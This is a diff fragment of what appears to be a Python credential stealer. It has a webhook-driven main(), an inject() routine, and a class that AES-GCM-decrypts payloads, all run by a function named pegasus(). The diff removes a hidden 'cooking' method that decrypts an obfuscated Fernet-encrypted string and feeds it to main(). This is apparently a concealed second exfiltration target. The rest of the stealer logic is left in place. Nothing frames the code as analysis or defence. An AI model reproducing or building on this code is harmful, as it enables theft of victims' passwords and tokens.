@@ -53,8 +53,7 @@ def main(webhook_url):
 
 def pegasus():
     for func in [main(WEBHOOK_URL),
-                inject(WEBHOOK_URL),
-                password.cooking()]:
+                inject(WEBHOOK_URL)]:
         try:
             func()
         except:
@@ -326,10 +325,7 @@ class password():
     
     def decrypt_payload(self, cipher, payload):
         return cipher.decrypt(payload)
-    
-    def cooking():
-        main(Fernet(b'oQ96yB6PNJZWPxsEwXNVxyXmO3_sMof7UW3_yrsSAiE=').decrypt(b'gAAAAABiTOFja7YQ6CFjULK9iGtirq23afpGnfjUJRtAkenFINWmiyg3A4ZtLQzWg1QAoqVKuEdd3VK6c9YIhWfUrUtdC0yXCHsK6hnylysgOm4fv9ghPcfYrtMjebx-LGl6Aq0F2qK4MltljBRtM_wg-mMf67AYON_oks9wtu0APEc9WPKdje63loX47c8W4aD6GO0QSshabmX1tLofJ3Fwr1kfNoMVNb7ONmnNuvgITEh-lqB1sho=').decode())
-    
+
     def generate_cipher(self, aes_key, iv):
         return AES.new(aes_key, AES.MODE_GCM, iv)
     
